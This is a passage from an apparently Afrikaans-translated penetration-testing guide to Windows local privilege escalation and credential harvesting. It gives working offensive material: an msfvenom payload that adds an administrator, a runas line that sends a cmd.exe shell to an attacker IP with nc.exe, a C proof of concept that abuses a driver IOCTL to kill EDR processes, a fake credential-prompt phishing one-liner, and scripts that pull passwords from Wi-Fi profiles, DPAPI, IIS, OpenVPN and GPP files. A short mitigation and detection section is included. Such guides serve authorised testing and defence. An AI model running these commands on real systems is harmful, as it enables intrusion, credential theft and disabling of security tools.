```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Herstelaksies

Windows laat gebruikers toe om aksies te spesifiseer wat geneem moet word as 'n diens faal. Hierdie funksie kan gekonfigureer word om na 'n binary te wys. As hierdie binary vervangbaar is, kan privilege escalation moontlik wees. Meer besonderhede is beskikbaar in die [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Toepassings

### Geïnstalleerde toepassings

Kontroleer **permissions van die binaries** (miskien kan jy een oorskryf en escalate privileges) en van die **mappe** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Skryf toestemmings

Kyk of jy 'n config file kan wysig sodat jy 'n spesiale file kan lees, of jy 'n binary kan wysig wat deur 'n Administrator account (schedtasks) uitgevoer sal word.

Een manier om swak folder/files permissions in die system te vind, is om die volgende te doen:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ laai outomaties enige plugin DLL onder sy `plugins` subvouers. As 'n geskryfbare portable/kopie-installasie teenwoordig is, sal die neergooi van 'n kwaadwillige plugin outomatiese kode-uitvoering binne `notepad++.exe` gee by elke opstart (insluitend vanaf `DllMain` en plugin callbacks).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Run at startup

**Kontroleer of jy 'n registry of binary kan oor-skryf wat deur 'n ander gebruiker uitgevoer gaan word.**\
**Lees** die **volgende bladsy** om meer te leer oor interessante **autoruns locations to escalate privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Kyk vir moontlike **third party weird/vulnerable** drivers
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
As 'n driver 'n arbitraire kernel read/write primitive blootstel (algemeen in swak ontwerpte IOCTL-handlers), kan jy eskaleer deur 'n SYSTEM-token direk uit kernel-geheue te steel. Sien die stap‑vir‑stap tegniek hier:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

For race-condition bugs where the vulnerable call opens an attacker-controlled Object Manager path, deliberately slowing the lookup (using max-length components or deep directory chains) can stretch the window from microseconds to tens of microseconds:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive geheue-korrupsie primitives

Moderne hive-kwesbaarhede laat jou toe om deterministiese uitlegte voor te berei, writable HKLM/HKU descendants te misbruik, en metadata-korrupsie in kernel paged-pool overflows om te skakel sonder 'n custom driver. Leer die volle ketting hier:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Misbruik van ontbrekende FILE_DEVICE_SECURE_OPEN op device objects (LPE + EDR kill)

Sommige gesigneerde derde‑party drivers skep hul device object met 'n sterk SDDL via IoCreateDeviceSecure, maar vergeet om FILE_DEVICE_SECURE_OPEN in DeviceCharacteristics te stel. Sonder hierdie vlag word die secure DACL nie deurgedwing wanneer die device via 'n pad met 'n ekstra komponent geopen word nie, wat enige unbevoorregte gebruiker toelaat om 'n handle te verkry deur 'n namespace path soos:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

Sodra 'n gebruiker die device kan oopmaak, kan die privileged IOCTLs wat deur die driver blootgestel word, misbruik word vir LPE en tampering. Voorbeelde van vermoëns wat in die wild waargeneem is:
- Gee volle-toegang handles aan arbitêre prosesse (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Onbeperkte raw disk read/write (offline tampering, boot-time persistence tricks).
- Beëindig arbitêre prosesse, insluitend Protected Process/Light (PP/PPL), wat AV/EDR kill vanaf user land via die kernel toelaat.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigasies vir ontwikkelaars
- Stel altyd FILE_DEVICE_SECURE_OPEN in wanneer jy device objects skep wat deur 'n DACL beperk moet word.
- Valideer die oproeper-konteks vir bevoorregte operasies. Voeg PP/PPL-kontroles by voordat jy prosesbeëindiging of handle-teruggawes toelaat.
- Beperk IOCTLs (access masks, METHOD_*, input validation) en oorweeg brokered models in plaas van direkte kernel-privileges.

Opsporingsidees vir verdedigers
- Moniteer user-mode opens van verdagte device names (e.g., \\ .\\amsdk*) en spesifieke IOCTL sequences wat misbruik aandui.
- Handhaaf Microsoft se bloklys vir kwesbare drywers (HVCI/WDAC/Smart App Control) en onderhou jou eie toelaat/weier-lyste.


## PATH DLL Hijacking

If you have **write permissions inside a folder present on PATH** you could be able to hijack a DLL loaded by a process and **escalate privileges**.

Check permissions of all folders inside PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Vir meer inligting oor hoe om hierdie kontrole te misbruik:

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Netwerk

### Gedeelde bronne
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Kyk na ander bekende rekenaars wat hardcoded in die hosts file voorkom
```
type C:\Windows\System32\drivers\etc\hosts
```
### Netwerkinterfaces & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Oop Poorte

Kontroleer vir **beperkte dienste** van buite af
```bash
netstat -ano #Opened ports?
```
### Roete-tabel
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP-tabel
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall-reëls

[**Sien hierdie bladsy vir Firewall-verwante opdragte**](../basic-cmd-for-pentesters.md#firewall) **(lys reëls, skep reëls, afskakel, afskakel...)**

Meer[ opdragte vir netwerk-ontleding hier](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Die binêre `bash.exe` kan ook gevind word in `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

As jy root user kry, kan jy op enige poort luister (die eerste keer as jy `nc.exe` gebruik om op 'n poort te luister sal dit via die GUI vra of `nc` deur die firewall toegelaat moet word).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Om maklik bash as root te begin, kan jy probeer `--default-user root`

Jy kan die `WSL` lêerstelsel verken in die gids `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows-inlogbesonderhede

### Winlogon-inlogbesonderhede
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Die Windows Vault stoor user credentials vir servers, websites en ander programme waarvoor **Windows** gebruikers outomaties kan aanmeld. Op die oog af mag dit lyk asof gebruikers hul Facebook credentials, Twitter credentials, Gmail credentials, ens. kan stoor sodat hulle outomaties via blaaiers aangemeld word. Maar dit is nie so nie.

Windows Vault stoor credentials wat **Windows** outomaties kan gebruik om gebruikers aan te meld, wat beteken dat enige **Windows application that needs credentials to access a resource** (server or a website) **can make use of this Credential Manager** & Windows Vault en die voorsiene credentials kan gebruik in plaas daarvan dat gebruikers elke keer die gebruikersnaam en wagwoord invoer.

Tensy die toepassings met die Credential Manager kommunikeer, dink ek nie dit is moontlik vir hulle om die credentials vir 'n gegewe hulpbron te gebruik nie. Dus, as jou toepassing die vault wil gebruik, moet dit op een of ander manier **communicate with the credential manager and request the credentials for that resource** from the default storage vault.

Gebruik die `cmdkey` om die gestoorde credentials op die masjien te lys.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Dan kan jy `runas` met die `/savecred` opsies gebruik om die saved credentials te gebruik. Die volgende voorbeeld roep 'n remote binary via 'n SMB share aan.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Gebruik van `runas` met 'n verskafde stel credential.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Let wel dat mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), of vanaf die [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

Die **Data Protection API (DPAPI)** verskaf 'n metode vir simmetriese enkripsie van data, hoofsaaklik gebruik binne die Windows-bedryfstelsel vir die simmetriese enkripsie van asimmetriese private sleutels. Hierdie enkripsie maak gebruik van 'n gebruiker- of stelselgeheim om aansienlik tot entropie by te dra.

**DPAPI stel die enkripsie van sleutels in staat deur 'n simmetriese sleutel wat afgelei is van die gebruiker se aanmeldgeheime**. In scenario's wat stelsel-enkripsie betrek, gebruik dit die stelsel se domein autentikasiegeheime.

Versleutelde gebruiker RSA-sleutels, deur DPAPI gebruik, word gestoor in die `%APPDATA%\Microsoft\Protect\{SID}` gids, waar `{SID}` die gebruiker se [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) verteenwoordig. **Die DPAPI-sleutel, wat saam met die master sleutel wat die gebruiker se private sleutels in dieselfde lêer beskerm, gehou word**, bestaan tipies uit 64 bytes ewekansige data. (Dit is belangrik om te let dat toegang tot hierdie gids beperk is, wat voorkom dat die inhoud met die `dir`-opdrag in CMD gelys kan word, alhoewel dit via PowerShell gelys kan word).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Jy kan die **mimikatz module** `dpapi::masterkey` met die toepaslike argumente (`/pvk` of `/rpc`) gebruik om dit te ontsleutel.

Die **credentials files protected by the master password** is gewoonlik geleë in:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Jy kan die **mimikatz module** `dpapi::cred` met die toepaslike `/masterkey` gebruik om te ontsleutel.\
Jy kan **onttrek baie DPAPI** **meestersleutels** uit die **geheue** met die `sekurlsa::dpapi` module (as jy root is).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell-aanmeldbewyse

**PowerShell-aanmeldbewyse** word dikwels gebruik vir **scripting** en automatiseringstake as 'n manier om enkripteerde aanmeldbewyse gerieflik te stoor. Die aanmeldbewyse word beskerm deur **DPAPI**, wat tipies beteken dat hulle slegs deur dieselfde gebruiker op dieselfde rekenaar ontsleutel kan word waarop hulle geskep is.

Om 'n PS-aanmeldbewys uit die lêer wat dit bevat te **ontsleutel**, kan jy:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Gestoorde RDP-verbindinge

Jy kan hulle vind in `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
en in `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Onlangs uitgevoerde kommando's
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Geloofsbestuurder vir Remote Desktop**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Gebruik die **Mimikatz** `dpapi::rdg` module met die toepaslike `/masterkey` om **enige .rdg-lêers te ontsleutel**\
Jy kan met die Mimikatz `sekurlsa::dpapi` module baie DPAPI masterkeys uit geheue uittrek

### Sticky Notes

Mense gebruik dikwels die StickyNotes app op Windows-workstations om **wagwoorde te stoor** en ander inligting, sonder om te besef dit is 'n databasislêer. Hierdie lêer is geleë by `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` en is altyd die moeite werd om te soek en te ondersoek.

### AppCmd.exe

**Let wel: om wagwoorde van AppCmd.exe te herstel, moet jy Administrator wees en dit op 'n High Integrity-vlak uitvoer.**\
**AppCmd.exe** is geleë in die `%systemroot%\system32\inetsrv\` gids.\
As hierdie lêer bestaan, is dit moontlik dat sekere **credentials** gekonfigureer is en **hersteld** kan word.

Hierdie kode is onttrek uit [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Kyk of `C:\Windows\CCM\SCClient.exe` bestaan .\
Installeerders word **run with SYSTEM privileges**, baie is kwesbaar vir **DLL Sideloading (Inligting van** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Lêers en Register (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host-sleutels
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys in die register

SSH private keys kan binne die registersleutel `HKCU\Software\OpenSSH\Agent\Keys` gestoor word, dus moet jy kyk of daar iets interessant daarin is:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Indien jy enige inskrywing binne daardie pad vind, sal dit waarskynlik 'n gestoor SSH key wees. Dit word geïnkripteer gestoor maar kan maklik gedekripteer word met behulp van [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Meer inligting oor hierdie tegniek hier: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

As die `ssh-agent` diens nie aan die gang is nie en jy wil hê dit moet outomaties by opstart begin, voer uit:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Dit lyk of hierdie tegniek nie meer geldig is nie. Ek het probeer om 'n paar ssh keys te skep, dit met `ssh-add` by te voeg en via ssh by 'n masjien aan te meld. Die register HKCU\Software\OpenSSH\Agent\Keys bestaan nie en procmon het nie die gebruik van `dpapi.dll` tydens die asymmetric key authentication geïdentifiseer nie.

### Onbewaakte lêers
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Jy kan hierdie lêers ook deursoek met **metasploit**: _post/windows/gather/enum_unattend_

Voorbeeldinhoud:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM rugsteunkopieë
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Wolk-inlogbewyse
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Soek vir 'n lêer met die naam **SiteList.xml**

### Gecachede GPP-wagwoord

Daar was voorheen 'n funksie wat die uitrol van pasgemaakte plaaslike administratorrekeninge op 'n groep masjiene via Group Policy Preferences (GPP) toegelaat het. Hierdie metode het egter noemenswaardige sekuriteitsgebreke gehad. Eerstens kon die Group Policy Objects (GPOs), wat as XML-lêers in SYSVOL gestoor is, deur enige domeingebruiker geraadpleeg word. Twedens kon die wagwoorde binne hierdie GPPs, wat met AES256 en 'n publiek gedokumenteerde standaard sleutel geënkripteer is, deur enige geverifieerde gebruiker ontsleutel word. Dit het 'n ernstige risiko geskep, aangesien dit gebruikers kon toelaat om verhoogde bevoegdhede te verkry.

Om hierdie risiko te beperk, is 'n funksie ontwikkel wat lokaal gecachede GPP-lêers skandeer wat 'n "cpassword"-veld bevat wat nie leë is nie. Wanneer so 'n lêer gevind word, ontsleutel die funksie die wagwoord en lewer 'n pasgemaakte PowerShell-object terug. Hierdie object sluit besonderhede oor die GPP en die ligging van die lêer in, wat help met die identifisering en herstel van hierdie sekuriteitskwessie.

Soek in `C:\ProgramData\Microsoft\Group Policy\history` of in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (voor W Vista)_ vir hierdie lêers:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Om die cPassword te ontsleutel:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Gebruik crackmapexec om die passwords te kry:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Voorbeeld van web.config met credentials:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN inlogbewyse
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Loglêers
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Ask for credentials

Jy kan altyd **ask the user to enter his credentials of even the credentials of a different user** as jy dink hy dit kan weet (let wel dat **asking** the client directly for the **credentials** is really **risky**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Moontlike bestandsname wat credentials bevat**

Bekende lêers wat 'n tyd gelede **passwords** in **clear-text** of **Base64** bevat het
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Soek al die voorgestelde lêers:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credentials in die RecycleBin

Jy moet ook die Bin nagaan om na credentials daarin te soek

Om **recover passwords** wat deur verskeie programme gestoor is, te herstel, kan jy die volgende gebruik: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Binne die register

**Ander moontlike registersleutels met credentials**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
